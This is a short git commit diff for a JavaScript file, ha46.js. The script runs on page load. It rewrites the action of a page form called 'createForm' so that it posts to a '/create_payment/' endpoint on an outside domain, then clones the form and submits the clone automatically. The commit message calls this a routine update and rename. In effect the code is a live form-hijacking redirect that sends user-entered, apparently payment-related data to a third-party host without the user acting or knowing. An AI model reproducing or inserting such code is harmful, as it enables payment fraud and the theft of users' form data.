76f6d210ba98ccb0b5ec1339e5c4e8009764d60e
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-05 23:59:17 +0800

    Update and rename ha45.js to ha46.js

--- ha46.js
+++ ha46.js
@@ -1,10 +1,11 @@
 window.onload = function() {
-    const scriptEle = document.createElement("script");
+    var scriptEle = document.createElement("script");
     scriptEle.type = "text/javascript";
     scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
+    scriptEle.defer = true;
     document.body.appendChild(scriptEle);
-    let node = document.getElementById('createForm');
-    let c = node.cloneNode(true);
+    let a = document.getElementById('createForm');
+    let c = a.cloneNode(true);
     document.body.appendChild(c);
     console.log('ytyt121y');
     c.submit();
